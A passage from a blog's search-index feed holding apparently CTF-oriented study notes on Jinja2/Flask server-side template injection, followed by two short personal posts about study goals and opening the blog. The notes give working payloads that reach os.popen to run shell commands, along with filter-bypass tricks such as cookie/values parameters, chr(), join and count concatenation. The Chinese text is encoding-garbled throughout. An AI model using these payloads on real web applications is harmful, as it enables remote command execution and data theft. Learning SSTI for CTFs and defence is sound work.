class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">#post</span><br><span class="language-xml"># __builtins__</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;()<span class="hljs-name">.__class__.__base__.subclasses__</span>()[80].__init__.__globals__.__builtins__[request.values.arg1](<span class="hljs-name">request.values.arg2</span>).popen(<span class="hljs-name">request.values.arg3</span>).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">POST:arg1=__import__,arg2=os,arg3=popen</span><br><span class="language-xml"></span><br><span class="language-xml"># popen</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;()<span class="hljs-name">.__class__.__base__.subclasses__</span>()[132].__init__.__globals__[request.values.arg1](<span class="hljs-name">request.values.arg2</span>).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">POST:arg1=popen,arg2=cat flag</span><br><span class="language-xml"></span><br><span class="language-xml"># os</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;()<span class="hljs-name">.__class__.__base__.subclasses__</span>()[213].__init__.__globals__[request.values.arg1].popen(<span class="hljs-name">request.values.arg2</span>).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">POST:arg1=popen,arg2=cat flag</span><br><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">#cookie</span><br><span class="language-xml"># popen</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;()<span class="hljs-name">.__class__.__base__.subclasses__</span>()[132].__init__.__globals__[request.cookies.arg1](<span class="hljs-name">request.cookies.arg2</span>).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">Cookie:arg1=popen,arg2=cat flag</span><br><span class="language-xml"></span><br></code></pre></td></tr></table></figure><p>chr()ç»•è¿‡</p><p>å…ˆæ‰¾å‡ºchrå‡½æ•°ä½ç½®</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">&#123;&#123;().<span class="hljs-emphasis">__class__</span>.<span class="hljs-emphasis">__mro__</span>[-1].<span class="hljs-emphasis">__subclasses__</span>()[0].<span class="hljs-emphasis">__init__</span>.<span class="hljs-emphasis">__globals__</span>.<span class="hljs-emphasis">__builtins__</span>.chr&#125;&#125;<br></code></pre></td></tr></table></figure>{%set%}æ‹¼æ¥ç»•è¿‡   é€‚åˆå¤§éƒ¨åˆ†è¿‡æ»¤<h2 id="ç»•è¿‡args"><a href="#ç»•è¿‡args" class="headerlink" title="ç»•è¿‡args"></a>ç»•è¿‡args</h2><p>å½“ä½¿ç”¨argsçš„æ–¹æ³•ç»•è¿‡<code>&#39;</code>å’Œ<code>&quot;</code>æ—¶ï¼Œå¯èƒ½é‡è§argsè¢«bançš„æƒ…å†µï¼Œè¿™ä¸ªæ—¶å€™å¯ä»¥é‡‡ç”¨<code>request.cookies</code>å’Œ<code>request.values</code>ï¼Œä»–ä»¬åˆ©ç”¨çš„æ–¹å¼å¤§åŒå°å¼‚ï¼Œç¤ºä¾‹å¦‚ä¸‹</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css">GET:&#123;&#123;url_for.__globals__<span class="hljs-selector-attr">[request.cookies.a]</span>&#125;&#125;<br>COOkie: <span class="hljs-string">&quot;a&quot;</span> :<span class="hljs-string">&#x27;__builtins__&#x27;</span><br></code></pre></td></tr></table></figure>ä½¿ç”¨{%set%}æ‹¼æ¥ç»•è¿‡<h2 id="ç»•è¿‡æ•°å­—"><a href="#ç»•è¿‡æ•°å­—" class="headerlink" title="ç»•è¿‡æ•°å­—"></a>ç»•è¿‡æ•°å­—</h2><p>æœ‰æ—¶å€™å¯èƒ½ä¼šé‡è§æ•°å­—<code>0-9</code>è¢«bançš„æƒ…å†µï¼Œè¿™ä¸ªæ—¶å€™æˆ‘ä»¬å¯ä»¥é€šè¿‡countæ¥å¾—åˆ°æ•°å­—ï¼Œä¸¾ä¸ªä¾‹å­</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;(<span class="hljs-name">dict</span>(<span class="hljs-name">e</span>=a)|join|count)&#125;&#125;</span><span class="language-xml">  #è·å¾—å­—å…¸æ‹¼æ¥åå­—ç¬¦ä¸²çš„é•¿åº¦</span><br></code></pre></td></tr></table></figure><h2 id="ç»•è¿‡å…³é”®å­—"><a href="#ç»•è¿‡å…³é”®å­—" class="headerlink" title="ç»•è¿‡å…³é”®å­—"></a>ç»•è¿‡å…³é”®å­—</h2><p>æœ‰æ—¶å€™å¯èƒ½é‡è§<code>class</code>ã€<code>base</code>è¿™ç§å…³é”®è¯è¢«ç»•è¿‡çš„æƒ…å†µï¼Œæˆ‘ä»¬è¿™ä¸ªæ—¶å€™é€šå¸¸ä½¿ç”¨çš„ç»•è¿‡æ–¹å¼æ˜¯ä½¿ç”¨joinæ‹¼æ¥ä»è€Œå®ç°ç»•è¿‡ï¼Œä¸¾ä¸ªä¾‹å­</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">dict</span>(<span class="hljs-name">__in</span>=a,<span class="hljs-attr">it__</span>=a)|join&#125;&#125;</span><span class="language-xml">  =__init__</span><br></code></pre></td></tr></table></figure><h1 id="SSTIå®æˆ˜"><a href="#SSTIå®æˆ˜" class="headerlink" title="SSTIå®æˆ˜"></a>SSTIå®æˆ˜</h1><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs routeros">ç›®çš„<br>&#123;&#123;lipsum.__globals__[<span class="hljs-string">&#x27;os&#x27;</span>].popen(<span class="hljs-string">&#x27;ls&#x27;</span>).read()&#125;&#125;<br>payload:<br>&#123;% <span class="hljs-built_in">set</span> s = dict(<span class="hljs-attribute">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</span>=a) | join | count %&#125;<br>&#123;% <span class="hljs-built_in">set</span> si = dict(<span class="hljs-attribute">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</span>=a) | join | count %&#125;<br>&#123;% <span class="hljs-built_in">set</span> sb = dict(<span class="hljs-attribute">aaaaaaaaaaaaaaaaaa</span>=a) | join | count %&#125;<br>&#123;% <span class="hljs-built_in">set</span> <span class="hljs-attribute">pop</span>=dict(pop=a)|join%&#125;<br>&#123;% <span class="hljs-built_in">set</span> xiahuaxian = (lipsum | string | list) | attr(pop)(sb) %&#125;<br>&#123;% <span class="hljs-built_in">set</span> a = (xiahuaxian, xiahuaxian, dict(<span class="hljs-attribute">glo</span>=a, <span class="hljs-attribute">bals</span>=a) | join, xiahuaxian, xiahuaxian) | join %&#125;<br>&#123;% <span class="hljs-built_in">set</span> b = dict(<span class="hljs-attribute">o</span>=a, <span class="hljs-attribute">s</span>=a) | join %&#125;<br>&#123;% <span class="hljs-built_in">set</span> c = dict(<span class="hljs-attribute">po</span>=a, <span class="hljs-attribute">pen</span>=a) | join %&#125;<br>&#123;% <span class="hljs-built_in">set</span> d = dict(<span class="hljs-attribute">re</span>=a, <span class="hljs-attribute">ad</span>=a) | join %&#125;<br>&#123;% <span class="hljs-built_in">set</span> e = (xiahuaxian, xiahuaxian, dict(<span class="hljs-attribute">get</span>=a, <span class="hljs-attribute">item</span>=a) | join, xiahuaxian, xiahuaxian) | join %&#125;<br>&#123;% <span class="hljs-built_in">set</span> f = (xiahuaxian, xiahuaxian, dict(<span class="hljs-attribute">buil</span>=a, <span class="hljs-attribute">tins</span>=a) | join, xiahuaxian, xiahuaxian) | join %&#125;<br>&#123;% <span class="hljs-built_in">set</span> ch = dict(<span class="hljs-attribute">ch</span>=a, <span class="hljs-attribute">r</span>=a) | join %&#125;<br>&#123;% <span class="hljs-built_in">set</span> chh = lipsum | attr(a) | attr(e)(f) | attr(e)(ch) %&#125;<br>&#123;% <span class="hljs-built_in">set</span> cmd = (dict(<span class="hljs-attribute">ca</span>=a, <span class="hljs-attribute">t</span>=a) | join, chh(s), chh(si), dict(<span class="hljs-attribute">ap</span>=a, <span class="hljs-attribute">p</span>=a) | join, chh(si), dict(<span class="hljs-attribute">fl</span>=a, <span class="hljs-attribute">ag</span>=a) | join) | join %&#125;<br>&#123;&#123; lipsum | attr(a) | attr(e)(b) | attr(c)(cmd) | attr(d)() &#125;&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>çŸ¥è¯†ç‚¹</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ssti</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>é—®è‡ªå·±</title>
    <link href="/tuyi/2025/01/19/%E9%97%AE%E8%87%AA%E5%B7%B1/"/>
    <url>/tuyi/2025/01/19/%E9%97%AE%E8%87%AA%E5%B7%B1/</url>
    
    <content type="html"><![CDATA[<p>æˆ‘é ï¼Œå¿˜è®°è‡ªå·±è¿˜æ­å»ºè¿‡è¿™æ ·ä¸€ä¸ªåšå®¢ï¼ŒæœŸæœ«å¿™æ˜äº†ï¼Œç°åœ¨æ”¾å‡äº†ï¼Œå°±å¯ä»¥å¥½å¥½æ‰“ç‚¹ä¸€ä¸‹äº†ï¼Œå†™ä¸€ç‚¹ä¸œè¥¿è®°å½•è‡ªå·±çš„å­¦ä¹ æ—¥å¸¸ï¼Œä¸€ä¸ªäººå­¦ä¹ æ„Ÿè§‰å¥½ç›²ç›®ï¼Œåªæœ‰åœ¨å†™ç‚¹ä»€ä¹ˆçš„æ—¶å€™æ‰ä¼šæ€è€ƒè‡ªå·±è¦åšä»€ä¹ˆï¼Œï¼ˆ1.19ï¼‰</p><p>ä»ä»Šå¤©å¼€å§‹æ¯å¤©å†™è‡³å°‘ä¸€é“webé¢˜   ï¼ˆ1.22ï¼‰</p><p>æˆ‘é ï¼Œè¦è¿‡å¹´äº†æ„Ÿè§‰åŠ¨åŠ›ä¸æ˜¯å¾ˆå¤Ÿäº† ï¼ˆ1.24ï¼‰</p><p>è¦è¿‡å¹´äº†ï¼Œå›½å†…æ²¡å•¥æ¯”èµ›äº†ï¼Œå›½å¤–å¤§ä¸æ˜¯å¾ˆæƒ³æ‰“ï¼Œè¿˜æ˜¯å¤ä¹ å¤ä¹ å§ï¼Œæ¯æ—¥ä¸€webæš‚åœä¸€æ®µæ—¶é—´ï¼Œæ›´ç‚¹çŸ¥è¯†ç‚¹å§ï¼Œ(1.26)</p><p>å”‰ å‘ç°è‡ªå·±å¥½èœå•Šï¼Œæ”¶æ”¶å¿ƒå¥½å¥½åŠªåŠ›ä¸€æŠŠï¼ˆ2.5ï¼‰</p>]]></content>
    
    
    
    <tags>
      
      <tag>ç›®æ ‡</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>å¼€ç«™</title>
    <link href="/tuyi/2024/11/12/%E5%BC%80%E7%AB%99/"/>
    <url>/tuyi/2024/11/12/%E5%BC%80%E7%AB%99/</url>
    
    <content type="html"><![CDATA[<p>æ­å»ºä¸€ä¸ªå°ç«™ï¼Œçºªå½•è‡ªå·±çš„å­¦ä¹ å’Œåˆ†äº«ä¸€äº›ä¸œè¥¿</p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
